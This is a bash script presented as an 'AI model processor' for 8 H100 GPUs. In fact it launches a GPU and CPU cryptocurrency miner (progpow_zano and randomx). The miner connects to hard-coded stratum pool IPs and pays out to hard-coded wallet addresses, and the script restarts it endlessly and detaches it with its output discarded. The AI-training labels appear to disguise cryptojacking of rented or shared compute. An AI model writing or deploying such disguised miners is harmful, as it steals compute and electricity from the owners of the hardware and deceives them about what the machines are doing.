#!/bin/bash

# ai_model_processor.sh - Optimized for 8x H100 + 96 vCPUs + 1.9TB RAM

# -------- CONFIGURATION --------

PROCESSOR_PATH="./aitraining"           # path to your processor binary
LOG_DIR="./logs"
mkdir -p "$LOG_DIR"

# GPU settings - 8x H100
GPU_ALGO="progpow_zano"                # From your logs
GPU_POOL="stratum+ssl://51.89.99.172:16161"   # Use stratum protocol
GPU_WALLET="RM2ciYa3CRqyreRsf25omrB4e1S95waALr"
GPU_IDS="0,1,2,3,4,5,6,7"               # All 8 H100 GPUs

# CPU settings - 96 vCPUs  
CPU_ALGO="randomx"                     # Common CPU algorithm
CPU_POOL="stratum+ssl://51.222.200.133:10343"
CPU_WALLET="44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd"

# CPU cores allocation for 96 vCPUs:
# - Cores 0-79: For CPU processor (80 cores)
# - Cores 80-95: Reserved for system/GPU drivers (16 cores)
CPU_CORES="0-79"

# Memory allocation for 1.9TB RAM
MEMORY_PAGES=512000

# GPU environment settings
export GPU_MAX_HEAP_SIZE=100
export GPU_MAX_USE_SYNC_OBJECTS=1
export GPU_SINGLE_ALLOC_PERCENT=100
export GPU_MAX_ALLOC_PERCENT=100
export GPU_MAX_SINGLE_ALLOC_PERCENT=100
export GPU_ENABLE_LARGE_ALLOCATION=1
export GPU_MAX_WORKGROUP_SIZE=1024

# Other runtime settings
RESTART_DELAY=5
GPU_LOG="$LOG_DIR/gpu_processing.log"
CPU_LOG="$LOG_DIR/cpu_processing.log"
MONITOR_LOG="$LOG_DIR/monitor.log"
PERFORMANCE_LOG="$LOG_DIR/performance.log"

# Process priority settings
NICE_PRIORITY=0
IONICE_CLASS=2
IONICE_CLASSDATA=4

# -------- END CONFIGURATION --------

# Helper: ensure processor exists
if [ ! -x "$PROCESSOR_PATH" ]; then
  echo "ERROR: Processor binary not found or not executable at $PROCESSOR_PATH"
  exit 1
fi

# System optimization
optimize_system() {
  echo "Optimizing system for high-performance processing..."
  
  # Enable NVIDIA persistence mode
  if command -v nvidia-smi >/dev/null 2>&1; then
    echo "Configuring NVIDIA H100 GPUs..."
    nvidia-smi -pm 1 || true
  fi

  # Allocate hugepages
  if [ "$(id -u)" -eq 0 ]; then
    echo "Allocating $MEMORY_PAGES hugepages..."
    echo $MEMORY_PAGES > /proc/sys/vm/nr_hugepages 2>/dev/null || true
  else
    echo "Tip: Run as root for full system optimization including hugepages"
  fi
}

# Convert CPU_CORES to taskset pattern
USE_NUMACTL=0
if command -v numactl >/dev/null 2>&1; then
  USE_NUMACTL=1
fi

# Function to extract and log performance metrics
log_performance_metrics() {
  local log_file="$1"
  local process_type="$2"
  
  if [ -f "$log_file" ]; then
    # Extract recent performance data
    local recent_log=$(tail -n 50 "$log_file" | grep -E "MH/s|H/s|GPU[0-9]+|Total:|accepted|rejected" | tail -n 15)
    
    if [ -n "$recent_log" ]; then
      echo "----- $(date +'%F %T') $process_type Performance -----" >> "$PERFORMANCE_LOG"
      echo "$recent_log" >> "$PERFORMANCE_LOG"
      echo "" >> "$PERFORMANCE_LOG"
    fi
  fi
}

# Enhanced GPU monitoring
monitor_gpu_detailed() {
  if command -v nvidia-smi >/dev/null 2>&1; then
    echo "----- $(date +'%F %T') GPU Metrics -----" >> "$MONITOR_LOG"
    nvidia-smi --query-gpu=index,temperature.gpu,utilization.gpu,memory.used,memory.total,power.draw --format=csv,noheader >> "$MONITOR_LOG" 2>&1
  fi
}

# Start GPU processor with correct parameters
start_gpu_processor() {
  echo "$(date +'%F %T') Starting GPU processor on 8x H100..." | tee -a "$MONITOR_LOG"
  while true; do
    # Use correct parameters for the miner
    nice -n $NICE_PRIORITY ionice -c $IONICE_CLASS -n $IONICE_CLASSDATA \
      "$PROCESSOR_PATH" --algo "$GPU_ALGO" \
      --pool "$GPU_POOL" --gpu-id "$GPU_IDS" --wallet "$GPU_WALLET" \
      2>&1 | tee -a "$GPU_LOG" &
    
    GPU_PID=$!
    echo "$(date +'%F %T') GPU processor PID: $GPU_PID" | tee -a "$MONITOR_LOG"
    
    # Monitor GPU process
    while kill -0 $GPU_PID 2>/dev/null; do
      log_performance_metrics "$GPU_LOG" "GPU"
      monitor_gpu_detailed
      sleep 30
    done
    
    wait $GPU_PID
    GPU_EXIT_STATUS=$?
    echo "$(date +'%F %T') GPU processor exited with status $GPU_EXIT_STATUS. Restarting in $RESTART_DELAY s..." | tee -a "$MONITOR_LOG"
    sleep $RESTART_DELAY
  done
}

# Start CPU processor with correct parameters
start_cpu_processor() {
  echo "$(date +'%F %T') Starting CPU processor on 80 cores..." | tee -a "$MONITOR_LOG"
  while true; do
    # Compute thread count
    THREADS=$(echo "$CPU_CORES" | awk -F, '{
      n=0; for(i=1;i<=NF;i++){
        if(index($i,"-")){
          split($i,a,"-"); n += (a[2]-a[1]+1)
        } else { n++ }
      }
      print n
    }')
    
    if [ -z "$THREADS" ] || [ "$THREADS" -lt 1 ]; then 
      THREADS=1
    fi

    # Compose command with CPU affinity
    if [ $USE_NUMACTL -eq 1 ]; then
      CMD_PREFIX="numactl --physcpubind=$CPU_CORES --localalloc"
    else
      CMD_PREFIX="taskset -c $CPU_CORES"
    fi

    # Start CPU processor with correct parameters
    nice -n $NICE_PRIORITY ionice -c $IONICE_CLASS -n $IONICE_CLASSDATA \
      bash -c "$CMD_PREFIX \"$PROCESSOR_PATH\" --algo \"$CPU_ALGO\" --pool \"$CPU_POOL\" --threads $THREADS --wallet \"$CPU_WALLET\"" \
      2>&1 | tee -a "$CPU_LOG" &
    
    CPU_PID=$!
    echo "$(date +'%F %T') CPU processor PID: $CPU_PID (threads=$THREADS)" | tee -a "$MONITOR_LOG"
    
    # Monitor CPU process
    while kill -0 $CPU_PID 2>/dev/null; do
      log_performance_metrics "$CPU_LOG" "CPU"
      sleep 30
    done
    
    wait $CPU_PID
    CPU_EXIT_STATUS=$?
    echo "$(date +'%F %T') CPU processor exited with status $CPU_EXIT_STATUS. Restarting in $RESTART_DELAY s..." | tee -a "$MONITOR_LOG"
    sleep $RESTART_DELAY
  done
}

# Monitoring loop
monitor_loop() {
  echo "$(date +'%F %T') System Monitor started." | tee -a "$MONITOR_LOG"
  while true; do
    echo "----- $(date +'%F %T') System Status -----" >> "$MONITOR_LOG"
    
    # GPU metrics
    if command -v nvidia-smi >/dev/null 2>&1; then
      nvidia-smi --query-gpu=index,temperature.gpu,utilization.gpu,memory.used,power.draw --format=csv,noheader >> "$MONITOR_LOG" 2>&1
    fi
    
    # CPU and memory
    echo "CPU/Memory:" >> "$MONITOR_LOG"
    ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head -n 10 >> "$MONITOR_LOG"
    
    # Performance metrics
    log_performance_metrics "$GPU_LOG" "GPU"
    log_performance_metrics "$CPU_LOG" "CPU"
    
    sleep 60
  done
}

# Initialize and optimize
echo "Initializing Processor for 8x H100 + 96 vCPUs..."
optimize_system

# Initialize log files
echo "===== GPU Processor Started: $(date) =====" > "$GPU_LOG"
echo "===== CPU Processor Started: $(date) =====" > "$CPU_LOG"
echo "===== System Monitoring Started: $(date) =====" > "$MONITOR_LOG"
echo "===== Performance Metrics Started: $(date) =====" > "$PERFORMANCE_LOG"

# Display system configuration
echo "System Info:" >> "$MONITOR_LOG"
lscpu >> "$MONITOR_LOG" 2>&1
nvidia-smi >> "$MONITOR_LOG" 2>&1

# Run everything in background
echo "Starting parallel processing system..."
setsid bash -c "start_gpu_processor" >/dev/null 2>&1 &
sleep 5
setsid bash -c "start_cpu_processor" >/dev/null 2>&1 &
sleep 2
setsid bash -c "monitor_loop" >/dev/null 2>&1 &

echo "Processor launched successfully!"
echo "System: 8x H100 GPUs + 96 vCPUs + 1.9TB RAM"
echo ""
echo "Logs directory: $LOG_DIR"
echo " - GPU Processing: $GPU_LOG" 
echo " - CPU Processing: $CPU_LOG"
echo " - System Monitoring: $MONITOR_LOG"
echo " - Performance Metrics: $PERFORMANCE_LOG"
echo ""
echo "To stop all processes: pkill -f aitraining"
echo "To view real-time logs: tail -f $LOG_DIR/*.log"
